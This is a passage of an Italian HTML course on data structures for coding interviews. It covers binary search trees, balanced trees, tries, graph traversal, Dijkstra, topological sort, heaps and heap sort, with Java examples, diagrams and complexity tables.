                    <p><a href="https://www.amazon.com/Implementing-Domain-Driven-Design-Vaughn-Vernon/dp/0321834577" target="_blank">Implementing DDD (Red Book)</a> - Vaughn Vernon</p>
                    <p><a href="https://www.amazon.com/Clean-Architecture-Craftsmans-Software-Structure/dp/0134494164" target="_blank">Clean Architecture</a> - Robert C. Martin</p>
                </div>
            </section>

            <!-- ==================== MODULO 12: DATA STRUCTURES AVANZATE ==================== -->
            <header class="module-header" id="modulo12">
                <span class="module-tag">Modulo 12</span>
                <h1>Data Structures Avanzate</h1>
                <p>Trees, Graphs, Heaps, Union-Find: strutture dati fondamentali per coding interviews</p>
            </header>

            <!-- Trees & Tries Section -->
            <section class="section" id="modulo12-trees">
                <h2>Trees & Tries</h2>

                <p>Gli alberi sono strutture dati gerarchiche fondamentali in computer science. Sono alla base di database (B-Tree), file system, compilatori (AST), e compaiono costantemente nelle coding interviews.</p>

                <h3>Binary Search Tree (BST)</h3>

                <p>Un <strong>Binary Search Tree</strong> è un albero binario dove ogni nodo rispetta l'invariante: tutti i valori nel sottoalbero sinistro sono <strong>minori</strong>, tutti nel sottoalbero destro sono <strong>maggiori</strong>. Questa proprietà permette ricerca, inserimento e cancellazione in O(h) dove h è l'altezza.</p>

                <div class="diagram">
                    <pre>
        Binary Search Tree
        ==================
              8
            /   \
           3     10
          / \      \
         1   6      14
            / \    /
           4   7  13

   Proprietà BST:
   • Nodo 3: sottoalbero sx {1} < 3 < sottoalbero dx {4,6,7} ✓
   • Nodo 8: sottoalbero sx {1,3,4,6,7} < 8 < sottoalbero dx {10,13,14} ✓
   • In-order traversal produce: 1, 3, 4, 6, 7, 8, 10, 13, 14 (ordinato!)
                    </pre>
                </div>

                <pre><code class="language-java">// Implementazione BST in Java
class BST&lt;T extends Comparable&lt;T&gt;&gt; {
    private Node root;

    private class Node {
        T value;
        Node left, right;
        Node(T value) { this.value = value; }
    }

    // Inserimento: O(h) - h = altezza dell'albero
    public void insert(T value) {
        root = insertRec(root, value);
    }

    private Node insertRec(Node node, T value) {
        if (node == null) return new Node(value);

        int cmp = value.compareTo(node.value);
        if (cmp < 0)      node.left = insertRec(node.left, value);
        else if (cmp > 0) node.right = insertRec(node.right, value);
        // Se cmp == 0: duplicato, ignora (o gestisci come preferisci)

        return node;
    }

    // Ricerca: O(h)
    public boolean search(T value) {
        Node current = root;
        while (current != null) {
            int cmp = value.compareTo(current.value);
            if (cmp == 0)      return true;
            else if (cmp < 0)  current = current.left;
            else               current = current.right;
        }
        return false;
    }

    // Cancellazione: O(h) - il caso più complesso
    public void delete(T value) {
        root = deleteRec(root, value);
    }

    private Node deleteRec(Node node, T value) {
        if (node == null) return null;

        int cmp = value.compareTo(node.value);
        if (cmp < 0)      node.left = deleteRec(node.left, value);
        else if (cmp > 0) node.right = deleteRec(node.right, value);
        else {
            // Caso 1: nodo foglia → rimuovi
            // Caso 2: un solo figlio → sostituisci con il figlio
            if (node.left == null)  return node.right;
            if (node.right == null) return node.left;

            // Caso 3: due figli → trova successore in-order (minimo del sottoalbero dx)
            Node successor = findMin(node.right);
            node.value = successor.value;
            node.right = deleteRec(node.right, successor.value);
        }
        return node;
    }

    private Node findMin(Node node) {
        while (node.left != null) node = node.left;
        return node;
    }

    // In-order traversal: produce elementi ordinati
    public void inOrder(Consumer&lt;T&gt; action) {
        inOrderRec(root, action);
    }

    private void inOrderRec(Node node, Consumer&lt;T&gt; action) {
        if (node == null) return;
        inOrderRec(node.left, action);
        action.accept(node.value);
        inOrderRec(node.right, action);
    }
}</code></pre>

                <table>
                    <thead>
                        <tr>
                            <th>Operazione</th>
                            <th>Caso medio</th>
                            <th>Caso peggiore (sbilanciato)</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td>Search</td>
                            <td>O(log n)</td>
                            <td>O(n)</td>
                        </tr>
                        <tr>
                            <td>Insert</td>
                            <td>O(log n)</td>
                            <td>O(n)</td>
                        </tr>
                        <tr>
                            <td>Delete</td>
                            <td>O(log n)</td>
                            <td>O(n)</td>
                        </tr>
                        <tr>
                            <td>In-order traversal</td>
                            <td colspan="2">O(n) sempre</td>
                        </tr>
                    </tbody>
                </table>

                <div class="info-box warning">
                    <strong>Attenzione al caso degenerato:</strong> Se inserisci elementi già ordinati (1, 2, 3, 4, 5...), il BST degenera in una lista linkata e tutte le operazioni diventano O(n). Per questo esistono gli alberi bilanciati.
                </div>

                <h3>Alberi Bilanciati: AVL e Red-Black Tree</h3>

                <p>Gli alberi bilanciati risolvono il problema del caso degenerato garantendo che l'altezza resti O(log n). Non devi implementarli nelle interview, ma devi conoscerne i principi.</p>

                <div class="diagram">
                    <pre>
   BST Degenerato vs AVL Bilanciato (stessi dati: 1,2,3,4,5)

   BST (inserimento ordinato)      AVL (auto-bilanciato)
         1                              2
          \                            / \
           2                          1   4
            \                            / \
             3                          3   5
              \
               4                   h = 2 (log₂5 ≈ 2.3)
                \
                 5

         h = 4 (= n-1)
                    </pre>
                </div>

                <table>
                    <thead>
                        <tr>
                            <th>Proprietà</th>
                            <th>AVL Tree</th>
                            <th>Red-Black Tree</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><strong>Bilanciamento</strong></td>
                            <td>Stretto: |h(sx) - h(dx)| ≤ 1</td>
                            <td>Rilassato: cammino più lungo ≤ 2× più corto</td>
                        </tr>
                        <tr>
                            <td><strong>Search</strong></td>
                            <td>Leggermente più veloce (albero più basso)</td>
                            <td>Leggermente più lento</td>
                        </tr>
                        <tr>
                            <td><strong>Insert/Delete</strong></td>
                            <td>Più rotazioni (fino a O(log n))</td>
                            <td>Meno rotazioni (max 2-3)</td>
                        </tr>
                        <tr>
                            <td><strong>Uso tipico</strong></td>
                            <td>Database, lookup-heavy</td>
                            <td>Java TreeMap/TreeSet, Linux kernel</td>
                        </tr>
                        <tr>
                            <td><strong>Garanzia</strong></td>
                            <td>h ≤ 1.44 × log₂(n)</td>
                            <td>h ≤ 2 × log₂(n+1)</td>
                        </tr>
                    </tbody>
                </table>

                <div class="info-box">
                    <strong>Nelle interview:</strong> Non ti chiederanno di implementare un AVL o Red-Black da zero. Ma devi sapere che Java <code>TreeMap</code> e <code>TreeSet</code> usano Red-Black Tree internamente, garantendo O(log n) per get/put/remove. Quando scegliere TreeMap vs HashMap: quando ti serve l'<strong>ordinamento</strong> delle chiavi.
                </div>

                <h3>Trie (Prefix Tree)</h3>

                <p>Un <strong>Trie</strong> è un albero specializzato per gestire stringhe. Ogni nodo rappresenta un carattere, e i percorsi dalla radice alle foglie formano le parole. È la struttura ideale per <strong>autocomplete</strong>, <strong>spell checking</strong>, e <strong>prefix matching</strong>.</p>

                <div class="diagram">
                    <pre>
   Trie con parole: "app", "apple", "api", "bat", "ball"

                     root
                    /    \
                   a      b
                   |      |
                   p      a
                  / \     |  \
                 p   i*   t*  l
                 |            |
                 l            l*
                 |
                 e*

   * = fine di una parola valida

   Ricerca "api": root → a → p → i → trovato! ✓
   Ricerca "ap":  root → a → p → NON è fine parola ✗
   Prefisso "ap": root → a → p → {app, apple, api} tutti i sotto-nodi
                    </pre>
                </div>

                <pre><code class="language-java">// Implementazione Trie in Java
class Trie {
    private static final int ALPHABET_SIZE = 26; // solo lettere minuscole

    private class TrieNode {
        TrieNode[] children = new TrieNode[ALPHABET_SIZE];
        boolean isEndOfWord = false;
    }

    private final TrieNode root = new TrieNode();

    // Inserimento: O(m) dove m = lunghezza della parola
    public void insert(String word) {
        TrieNode current = root;
        for (char c : word.toCharArray()) {
            int index = c - 'a';
            if (current.children[index] == null) {
                current.children[index] = new TrieNode();
            }
            current = current.children[index];
        }
        current.isEndOfWord = true;
    }

    // Ricerca esatta: O(m)
    public boolean search(String word) {
        TrieNode node = findNode(word);
        return node != null && node.isEndOfWord;
    }

    // Ricerca prefisso: O(m)
    public boolean startsWith(String prefix) {
        return findNode(prefix) != null;
    }

    private TrieNode findNode(String prefix) {
        TrieNode current = root;
        for (char c : prefix.toCharArray()) {
            int index = c - 'a';
            if (current.children[index] == null) return null;
            current = current.children[index];
        }
        return current;
    }

    // Autocomplete: trova tutte le parole con un dato prefisso
    public List&lt;String&gt; autocomplete(String prefix) {
        List&lt;String&gt; results = new ArrayList&lt;&gt;();
        TrieNode node = findNode(prefix);
        if (node != null) {
            collectWords(node, new StringBuilder(prefix), results);
        }
        return results;
    }

    private void collectWords(TrieNode node, StringBuilder sb, List&lt;String&gt; results) {
        if (node.isEndOfWord) results.add(sb.toString());
        for (int i = 0; i < ALPHABET_SIZE; i++) {
            if (node.children[i] != null) {
                sb.append((char) ('a' + i));
                collectWords(node.children[i], sb, results);
                sb.deleteCharAt(sb.length() - 1); // backtrack
            }
        }
    }
}

// Uso:
Trie trie = new Trie();
trie.insert("apple");
trie.insert("app");
trie.insert("api");
trie.search("app");        // true
trie.search("ap");         // false (non è fine parola)
trie.startsWith("ap");     // true
trie.autocomplete("ap");   // ["api", "app", "apple"]</code></pre>

                <table>
                    <thead>
                        <tr>
                            <th>Operazione</th>
                            <th>Trie</th>
                            <th>HashMap</th>
                            <th>Sorted Array</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td>Search esatta</td>
                            <td>O(m)</td>
                            <td>O(m) average</td>
                            <td>O(m log n)</td>
                        </tr>
                        <tr>
                            <td>Prefix search</td>
                            <td><strong>O(p + k)</strong></td>
                            <td>O(n × m)</td>
                            <td>O(m log n + k)</td>
                        </tr>
                        <tr>
                            <td>Insert</td>
                            <td>O(m)</td>
                            <td>O(m) average</td>
                            <td>O(n)</td>
                        </tr>
                        <tr>
                            <td>Spazio</td>
                            <td>O(ALPHABET × n × m)</td>
                            <td>O(n × m)</td>
                            <td>O(n × m)</td>
                        </tr>
                    </tbody>
                </table>

                <p><em>m = lunghezza stringa, n = numero di parole, p = lunghezza prefisso, k = numero risultati</em></p>
            </section>

            <!-- Graphs Section -->
            <section class="section" id="modulo12-graphs">
                <h2>Graphs</h2>

                <p>I grafi sono la struttura dati più generale: modellano relazioni tra entità. Social networks, mappe stradali, dependency resolution, web crawling - tutti problemi di grafi. Nelle interview, BFS e DFS sono fondamentali.</p>

                <h3>Rappresentazioni: Adjacency List vs Matrix</h3>

                <div class="diagram">
                    <pre>
   Grafo esempio (non diretto):

        0 --- 1
        |   / |
        |  /  |
        | /   |
        2 --- 3

   Adjacency List:               Adjacency Matrix:
   0: [1, 2]                        0  1  2  3
   1: [0, 2, 3]                  0 [0, 1, 1, 0]
   2: [0, 1, 3]                  1 [1, 0, 1, 1]
   3: [1, 2]                     2 [1, 1, 0, 1]
                                 3 [0, 1, 1, 0]
                    </pre>
                </div>

                <table>
                    <thead>
                        <tr>
                            <th>Criterio</th>
                            <th>Adjacency List</th>
                            <th>Adjacency Matrix</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><strong>Spazio</strong></td>
                            <td>O(V + E)</td>
                            <td>O(V²)</td>
                        </tr>
                        <tr>
                            <td><strong>Verifica arco (u,v)</strong></td>
                            <td>O(degree(u))</td>
                            <td><strong>O(1)</strong></td>
                        </tr>
                        <tr>
                            <td><strong>Iterare vicini di u</strong></td>
                            <td><strong>O(degree(u))</strong></td>
                            <td>O(V)</td>
                        </tr>
                        <tr>
                            <td><strong>Aggiungere arco</strong></td>
                            <td>O(1)</td>
                            <td>O(1)</td>
                        </tr>
                        <tr>
                            <td><strong>Quando usare</strong></td>
                            <td>Grafi sparsi (E << V²)</td>
                            <td>Grafi densi (E ≈ V²)</td>
                        </tr>
                    </tbody>
                </table>

                <pre><code class="language-java">// Rappresentazione con Adjacency List (la più usata nelle interview)
class Graph {
    private final int vertices;
    private final List&lt;List&lt;Integer&gt;&gt; adjList;

    public Graph(int vertices) {
        this.vertices = vertices;
        this.adjList = new ArrayList&lt;&gt;();
        for (int i = 0; i < vertices; i++) {
            adjList.add(new ArrayList&lt;&gt;());
        }
    }

    // Grafo non diretto: aggiungi arco in entrambe le direzioni
    public void addEdge(int u, int v) {
        adjList.get(u).add(v);
        adjList.get(v).add(u);
    }

    // Per grafo diretto: solo una direzione
    public void addDirectedEdge(int from, int to) {
        adjList.get(from).add(to);
    }

    public List&lt;Integer&gt; neighbors(int v) {
        return adjList.get(v);
    }
}</code></pre>

                <h3>BFS (Breadth-First Search)</h3>

                <p><strong>BFS</strong> esplora il grafo "per livelli": prima tutti i nodi a distanza 1, poi distanza 2, ecc. Usa una <strong>Queue</strong> (FIFO). È l'algoritmo ideale per trovare il <strong>shortest path in grafi non pesati</strong>.</p>

                <div class="diagram">
                    <pre>
   BFS dal nodo 0:

        0 --- 1 --- 4
        |     |
        2 --- 3
        |
        5

   Ordine di visita: 0 → 1, 2 → 3, 4, 5
                     (livello 0) (livello 1) (livello 2)

   Queue: [0] → [1,2] → [2,3,4] → [3,4,5] → [4,5] → [5] → []
                    </pre>
                </div>

                <pre><code class="language-java">// BFS: O(V + E) tempo, O(V) spazio
public List&lt;Integer&gt; bfs(Graph graph, int start) {
    List&lt;Integer&gt; order = new ArrayList&lt;&gt;();
    boolean[] visited = new boolean[graph.vertices()];
    Queue&lt;Integer&gt; queue = new LinkedList&lt;&gt;();

    visited[start] = true;
    queue.offer(start);

    while (!queue.isEmpty()) {
        int node = queue.poll();
        order.add(node);

        for (int neighbor : graph.neighbors(node)) {
            if (!visited[neighbor]) {
                visited[neighbor] = true;
                queue.offer(neighbor);
            }
        }
    }
    return order;
}

// BFS per shortest path (grafo non pesato)
public int shortestPath(Graph graph, int start, int end) {
    if (start == end) return 0;

    boolean[] visited = new boolean[graph.vertices()];
    Queue&lt;int[]&gt; queue = new LinkedList&lt;&gt;(); // [nodo, distanza]

    visited[start] = true;
    queue.offer(new int[]{start, 0});

    while (!queue.isEmpty()) {
        int[] current = queue.poll();
        int node = current[0], dist = current[1];

        for (int neighbor : graph.neighbors(node)) {
            if (neighbor == end) return dist + 1;
            if (!visited[neighbor]) {
                visited[neighbor] = true;
                queue.offer(new int[]{neighbor, dist + 1});
            }
        }
    }
    return -1; // non raggiungibile
}

// BFS su griglia (pattern molto comune nelle interview)
public int shortestPathGrid(int[][] grid) {
    int rows = grid.length, cols = grid[0].length;
    if (grid[0][0] == 1 || grid[rows-1][cols-1] == 1) return -1;

    int[][] directions = {{0,1}, {0,-1}, {1,0}, {-1,0}};
    boolean[][] visited = new boolean[rows][cols];
    Queue&lt;int[]&gt; queue = new LinkedList&lt;&gt;();

    visited[0][0] = true;
    queue.offer(new int[]{0, 0, 1}); // row, col, distance

    while (!queue.isEmpty()) {
        int[] curr = queue.poll();
        int r = curr[0], c = curr[1], dist = curr[2];

        if (r == rows-1 && c == cols-1) return dist;

        for (int[] dir : directions) {
            int nr = r + dir[0], nc = c + dir[1];
            if (nr >= 0 && nr < rows && nc >= 0 && nc < cols
                    && !visited[nr][nc] && grid[nr][nc] == 0) {
                visited[nr][nc] = true;
                queue.offer(new int[]{nr, nc, dist + 1});
            }
        }
    }
    return -1;
}</code></pre>

                <h3>DFS (Depth-First Search)</h3>

                <p><strong>DFS</strong> esplora il grafo "in profondità": segue un percorso fino in fondo prima di tornare indietro (backtracking). Usa uno <strong>Stack</strong> (o la ricorsione). È l'algoritmo ideale per <strong>cycle detection</strong>, <strong>topological sort</strong>, e <strong>connected components</strong>.</p>

                <div class="diagram">
                    <pre>
   DFS dal nodo 0 (scelta: nodo più piccolo prima):

        0 --- 1 --- 4
        |     |
        2 --- 3
        |
        5

   Ordine di visita: 0 → 1 → 3 → 2 → 5 → (backtrack) → 4

   Stack ricorsivo: 0 → 0,1 → 0,1,3 → 0,1,3,2 → 0,1,3,2,5
                    → 0,1,3,2 → 0,1,3 → 0,1 → 0,1,4 → 0,1 → 0
                    </pre>
                </div>

                <pre><code class="language-java">// DFS Ricorsivo: O(V + E) tempo, O(V) spazio (stack ricorsivo)
public void dfsRecursive(Graph graph, int start) {
    boolean[] visited = new boolean[graph.vertices()];
    dfsHelper(graph, start, visited);
}

private void dfsHelper(Graph graph, int node, boolean[] visited) {
    visited[node] = true;
    System.out.print(node + " ");

    for (int neighbor : graph.neighbors(node)) {
        if (!visited[neighbor]) {
            dfsHelper(graph, neighbor, visited);
        }
    }
}

// DFS Iterativo (con Stack esplicito)
public List&lt;Integer&gt; dfsIterative(Graph graph, int start) {
    List&lt;Integer&gt; order = new ArrayList&lt;&gt;();
    boolean[] visited = new boolean[graph.vertices()];
    Deque&lt;Integer&gt; stack = new ArrayDeque&lt;&gt;();

    stack.push(start);
    while (!stack.isEmpty()) {
        int node = stack.pop();
        if (visited[node]) continue;
        visited[node] = true;
        order.add(node);

        // Aggiungi vicini in ordine inverso per visitare in ordine naturale
        List&lt;Integer&gt; neighbors = graph.neighbors(node);
        for (int i = neighbors.size() - 1; i >= 0; i--) {
            if (!visited[neighbors.get(i)]) {
                stack.push(neighbors.get(i));
            }
        }
    }
    return order;
}

// Cycle Detection in grafo diretto (DFS con 3 colori)
public boolean hasCycle(int vertices, List&lt;List&lt;Integer&gt;&gt; adjList) {
    int[] color = new int[vertices]; // 0=white, 1=gray, 2=black

    for (int i = 0; i < vertices; i++) {
        if (color[i] == 0 && dfsCycle(i, adjList, color)) {
            return true;
        }
    }
    return false;
}

private boolean dfsCycle(int node, List&lt;List&lt;Integer&gt;&gt; adj, int[] color) {
    color[node] = 1; // gray: in corso di visita

    for (int neighbor : adj.get(node)) {
        if (color[neighbor] == 1) return true;  // back edge → ciclo!
        if (color[neighbor] == 0 && dfsCycle(neighbor, adj, color)) return true;
    }

    color[node] = 2; // black: completato
    return false;
}</code></pre>

                <h3>Dijkstra: Shortest Path in Grafi Pesati</h3>

                <p>L'algoritmo di <strong>Dijkstra</strong> trova il cammino più breve da un nodo sorgente a tutti gli altri in un grafo con pesi <strong>non negativi</strong>. Usa una <strong>Priority Queue</strong> (Min-Heap) per selezionare sempre il nodo con distanza minima.</p>

                <div class="diagram">
                    <pre>
   Grafo pesato:
                2
        A ──────── B
        |          |
      4 |          | 1
        |    1     |
        C ──────── D
         \        /
        5 \      / 3
           \    /
             E

   Dijkstra da A:
   Passo 1: dist[A]=0, visita A → aggiorna B(2), C(4)
   Passo 2: dist[B]=2, visita B → aggiorna D(2+1=3)
   Passo 3: dist[D]=3, visita D → aggiorna E(3+3=6)
   Passo 4: dist[C]=4, visita C → aggiorna D(4+1=5, no: 3<5), E(4+5=9, no: 6<9)
   Passo 5: dist[E]=6, visita E → fine

   Risultato: A→A=0, A→B=2, A→D=3, A→C=4, A→E=6
                    </pre>
                </div>

                <pre><code class="language-java">// Dijkstra: O((V + E) log V) con Priority Queue
public int[] dijkstra(int vertices, List&lt;List&lt;int[]&gt;&gt; adjList, int source) {
    // adjList.get(u) contiene int[]{v, weight}
    int[] dist = new int[vertices];
    Arrays.fill(dist, Integer.MAX_VALUE);
    dist[source] = 0;

    // Min-Heap: [distanza, nodo]
    PriorityQueue&lt;int[]&gt; pq = new PriorityQueue&lt;&gt;(
        Comparator.comparingInt(a -> a[0])
    );
    pq.offer(new int[]{0, source});

    boolean[] visited = new boolean[vertices];

    while (!pq.isEmpty()) {
        int[] current = pq.poll();
        int d = current[0], u = current[1];

        if (visited[u]) continue; // nodo già processato
        visited[u] = true;

        for (int[] edge : adjList.get(u)) {
            int v = edge[0], weight = edge[1];
            if (dist[u] + weight < dist[v]) {
                dist[v] = dist[u] + weight;
                pq.offer(new int[]{dist[v], v});
            }
        }
    }
    return dist; // dist[i] = distanza minima da source a i
}

// Esempio di utilizzo:
// Costruisci grafo
List&lt;List&lt;int[]&gt;&gt; graph = new ArrayList&lt;&gt;();
for (int i = 0; i < 5; i++) graph.add(new ArrayList&lt;&gt;());
graph.get(0).add(new int[]{1, 2}); // A→B peso 2
graph.get(0).add(new int[]{2, 4}); // A→C peso 4
graph.get(1).add(new int[]{3, 1}); // B→D peso 1
graph.get(2).add(new int[]{3, 1}); // C→D peso 1
graph.get(2).add(new int[]{4, 5}); // C→E peso 5
graph.get(3).add(new int[]{4, 3}); // D→E peso 3

int[] distances = dijkstra(5, graph, 0);
// distances = [0, 2, 4, 3, 6]</code></pre>

                <div class="info-box warning">
                    <strong>Dijkstra NON funziona con pesi negativi.</strong> Per pesi negativi (senza cicli negativi), usa Bellman-Ford: O(V × E). Per grafi con cicli negativi, non esiste shortest path finito.
                </div>

                <h3>Topological Sort</h3>

                <p>Il <strong>Topological Sort</strong> ordina i nodi di un DAG (Directed Acyclic Graph) tale che per ogni arco (u, v), u viene prima di v. Applicazioni: build systems, course scheduling, dependency resolution.</p>

                <pre><code class="language-java">// Topological Sort con DFS: O(V + E)
public List&lt;Integer&gt; topologicalSort(int vertices, List&lt;List&lt;Integer&gt;&gt; adjList) {
    boolean[] visited = new boolean[vertices];
    Deque&lt;Integer&gt; stack = new ArrayDeque&lt;&gt;();

    for (int i = 0; i < vertices; i++) {
        if (!visited[i]) {
            topoHelper(i, adjList, visited, stack);
        }
    }

    // Lo stack contiene l'ordine topologico (inverso del post-order DFS)
    List&lt;Integer&gt; result = new ArrayList&lt;&gt;();
    while (!stack.isEmpty()) {
        result.add(stack.pop());
    }
    return result;
}

private void topoHelper(int node, List&lt;List&lt;Integer&gt;&gt; adj,
                         boolean[] visited, Deque&lt;Integer&gt; stack) {
    visited[node] = true;
    for (int neighbor : adj.get(node)) {
        if (!visited[neighbor]) {
            topoHelper(neighbor, adj, visited, stack);
        }
    }
    stack.push(node); // aggiungi DOPO aver visitato tutti i vicini (post-order)
}

// Topological Sort con Kahn's Algorithm (BFS + in-degree): O(V + E)
public List&lt;Integer&gt; kahnTopologicalSort(int vertices, List&lt;List&lt;Integer&gt;&gt; adjList) {
    int[] inDegree = new int[vertices];
    for (List&lt;Integer&gt; neighbors : adjList) {
        for (int n : neighbors) inDegree[n]++;
    }

    Queue&lt;Integer&gt; queue = new LinkedList&lt;&gt;();
    for (int i = 0; i < vertices; i++) {
        if (inDegree[i] == 0) queue.offer(i); // nodi senza dipendenze
    }

    List&lt;Integer&gt; result = new ArrayList&lt;&gt;();
    while (!queue.isEmpty()) {
        int node = queue.poll();
        result.add(node);
        for (int neighbor : adjList.get(node)) {
            if (--inDegree[neighbor] == 0) {
                queue.offer(neighbor);
            }
        }
    }

    // Se result.size() != vertices → il grafo ha un ciclo (non è DAG)
    if (result.size() != vertices) {
        throw new IllegalStateException("Il grafo contiene un ciclo!");
    }
    return result;
}</code></pre>

                <div class="info-box">
                    <strong>BFS vs DFS - Quando usare cosa:</strong>
                    <br>• <strong>BFS</strong>: shortest path (non pesato), level-order traversal, "nearest" problems
                    <br>• <strong>DFS</strong>: cycle detection, topological sort, connected components, path existence, backtracking
                    <br>• <strong>Dijkstra</strong>: shortest path in grafi pesati (pesi ≥ 0)
                </div>
            </section>

            <!-- Heaps & Priority Queue Section -->
            <section class="section" id="modulo12-heaps">
                <h2>Heaps & Priority Queue</h2>

                <p>Un <strong>Heap</strong> è un albero binario completo che soddisfa la <strong>proprietà heap</strong>: in un Min-Heap, ogni nodo è minore o uguale ai suoi figli. In un Max-Heap, maggiore o uguale. L'heap è alla base di <strong>Priority Queue</strong>, Dijkstra, e molti problemi "top-K".</p>

                <h3>Min-Heap e Max-Heap</h3>

                <div class="diagram">
                    <pre>
   Min-Heap                    Max-Heap
       1                          9
      / \                        / \
     3   5                      7   8
    / \ /                      / \ /
   7  4 8                     3  5 2

   Proprietà Min-Heap:         Proprietà Max-Heap:
   padre ≤ figli               padre ≥ figli
   root = minimo               root = massimo

   Rappresentazione Array (Min-Heap):
   Index:  [0] [1] [2] [3] [4] [5]
   Value:   1   3   5   7   4   8

   Per indice i:
   • Padre:       (i - 1) / 2
   • Figlio sx:   2 * i + 1
   • Figlio dx:   2 * i + 2
                    </pre>
                </div>

                <pre><code class="language-java">// Min-Heap implementazione manuale
class MinHeap {
    private int[] heap;
    private int size;

    public MinHeap(int capacity) {
        heap = new int[capacity];
        size = 0;
    }

    // Insert: O(log n) - aggiungi in fondo, bubble up
    public void insert(int value) {
        heap[size] = value;
        bubbleUp(size);
        size++;
    }

    // Extract Min: O(log n) - rimuovi root, metti ultimo in cima, bubble down
    public int extractMin() {
        int min = heap[0];
        heap[0] = heap[--size];
        bubbleDown(0);
        return min;
    }

    // Peek: O(1)
    public int peek() {
        return heap[0];
    }

    private void bubbleUp(int index) {
        while (index > 0) {
            int parent = (index - 1) / 2;
            if (heap[index] >= heap[parent]) break;
            swap(index, parent);
            index = parent;
        }
    }

    private void bubbleDown(int index) {
        while (2 * index + 1 < size) {
            int left = 2 * index + 1;
            int right = 2 * index + 2;
            int smallest = left;

            if (right < size && heap[right] < heap[left]) {
                smallest = right;
            }
            if (heap[index] <= heap[smallest]) break;

            swap(index, smallest);
            index = smallest;
        }
    }

    private void swap(int i, int j) {
        int temp = heap[i];
        heap[i] = heap[j];
        heap[j] = temp;
    }
}</code></pre>

                <h3>Java PriorityQueue</h3>

                <p>In Java, <code>PriorityQueue</code> è un Min-Heap. Per un Max-Heap, usa <code>Collections.reverseOrder()</code> o un comparatore custom.</p>

                <pre><code class="language-java">// Min-Heap (default)
PriorityQueue&lt;Integer&gt; minHeap = new PriorityQueue&lt;&gt;();
minHeap.offer(5);
minHeap.offer(1);
minHeap.offer(3);
minHeap.poll();  // → 1 (minimo)
minHeap.peek();  // → 3

// Max-Heap
PriorityQueue&lt;Integer&gt; maxHeap = new PriorityQueue&lt;&gt;(Collections.reverseOrder());
maxHeap.offer(5);
maxHeap.offer(1);
maxHeap.offer(3);
maxHeap.poll();  // → 5 (massimo)

// PQ con oggetti custom (es: distanza minima per Dijkstra)
PriorityQueue&lt;int[]&gt; pq = new PriorityQueue&lt;&gt;(
    Comparator.comparingInt(a -> a[1]) // ordina per secondo elemento
);

// Pattern comune: "Top K elements"
// Trova i K elementi più grandi da un array
public int[] topK(int[] nums, int k) {
    // Min-Heap di dimensione k: mantieni i k più grandi
    PriorityQueue&lt;Integer&gt; minHeap = new PriorityQueue&lt;&gt;();
    for (int num : nums) {
        minHeap.offer(num);
        if (minHeap.size() > k) {
            minHeap.poll(); // rimuovi il più piccolo
        }
    }
    return minHeap.stream().mapToInt(Integer::intValue).toArray();
}

// Kth Largest Element: O(n log k)
public int findKthLargest(int[] nums, int k) {
    PriorityQueue&lt;Integer&gt; minHeap = new PriorityQueue&lt;&gt;();
    for (int num : nums) {
        minHeap.offer(num);
        if (minHeap.size() > k) minHeap.poll();
    }
    return minHeap.peek(); // il più piccolo dei k più grandi = il k-esimo
}

// Merge K Sorted Lists: O(n log k) dove n = totale elementi, k = numero liste
public List&lt;Integer&gt; mergeKSorted(List&lt;List&lt;Integer&gt;&gt; lists) {
    // PQ contiene: [valore, indice_lista, indice_elemento]
    PriorityQueue&lt;int[]&gt; pq = new PriorityQueue&lt;&gt;(
        Comparator.comparingInt(a -> a[0])
    );

    // Inserisci il primo elemento di ogni lista
    for (int i = 0; i < lists.size(); i++) {
        if (!lists.get(i).isEmpty()) {
            pq.offer(new int[]{lists.get(i).get(0), i, 0});
        }
    }

    List&lt;Integer&gt; result = new ArrayList&lt;&gt;();
    while (!pq.isEmpty()) {
        int[] curr = pq.poll();
        result.add(curr[0]);

        int listIdx = curr[1], elemIdx = curr[2];
        if (elemIdx + 1 < lists.get(listIdx).size()) {
            pq.offer(new int[]{lists.get(listIdx).get(elemIdx + 1), listIdx, elemIdx + 1});
        }
    }
    return result;
}</code></pre>

                <h3>Heap Sort</h3>

                <p><strong>Heap Sort</strong> ordina un array in-place usando un Max-Heap. Complessità: O(n log n) sempre, spazio O(1). Non è stabile (a differenza di Merge Sort).</p>

                <pre><code class="language-java">// Heap Sort: O(n log n) tempo, O(1) spazio
public void heapSort(int[] arr) {
    int n = arr.length;

    // Fase 1: Build Max-Heap (bottom-up) - O(n)
    for (int i = n / 2 - 1; i >= 0; i--) {
        heapify(arr, n, i);
    }

    // Fase 2: Extract max ripetutamente - O(n log n)
    for (int i = n - 1; i > 0; i--) {
        // Sposta il massimo (root) alla fine
        int temp = arr[0];
        arr[0] = arr[i];
        arr[i] = temp;

        // Ripristina proprietà heap sulla porzione ridotta
        heapify(arr, i, 0);
    }
}

private void heapify(int[] arr, int heapSize, int root) {
    int largest = root;
    int left = 2 * root + 1;
    int right = 2 * root + 2;

    if (left < heapSize && arr[left] > arr[largest])   largest = left;
    if (right < heapSize && arr[right] > arr[largest])  largest = right;

    if (largest != root) {
        int temp = arr[root];
        arr[root] = arr[largest];
        arr[largest] = temp;
        heapify(arr, heapSize, largest);
    }
}</code></pre>

                <table>
                    <thead>
                        <tr>
                            <th>Operazione Heap</th>
                            <th>Complessità</th>
                            <th>Note</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td>Insert</td>
                            <td>O(log n)</td>
                            <td>Bubble up</td>
                        </tr>
                        <tr>
                            <td>Extract Min/Max</td>
                            <td>O(log n)</td>
                            <td>Bubble down</td>
                        </tr>
                        <tr>
                            <td>Peek</td>
                            <td>O(1)</td>
                            <td>Root dell'heap</td>
                        </tr>
                        <tr>
                            <td>Build Heap</td>
                            <td>O(n)</td>
                            <td>Bottom-up heapify (non O(n log n)!)</td>
                        </tr>
                        <tr>
                            <td>Heap Sort</td>
                            <td>O(n log n)</td>
                            <td>Build + n extract</td>
                        </tr>
                    </tbody>
                </table>
            </section>

            <!-- Union-Find Section -->
            <section class="section" id="modulo12-unionfind">
                <h2>Union-Find (Disjoint Set)</h2>

